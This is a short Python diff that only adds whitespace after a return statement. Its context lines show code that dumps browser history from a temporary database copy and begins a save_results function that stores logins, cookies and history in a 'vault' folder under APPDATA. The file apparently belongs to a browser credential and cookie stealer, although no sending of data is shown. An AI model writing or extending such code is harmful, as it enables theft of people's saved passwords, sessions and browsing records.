@@ -117,7 +117,8 @@ def get_history(path: str, profile: str):
         result += "-----------------------------------------------------------\n"
     conn.close()
     os.remove(temp_history_db)
-    return result
+    return result 
+
 def save_results(logins, cookies, history):
     vault_dir = os.path.join(os.getenv('APPDATA'), 'vault')
     if not os.path.exists(vault_dir):
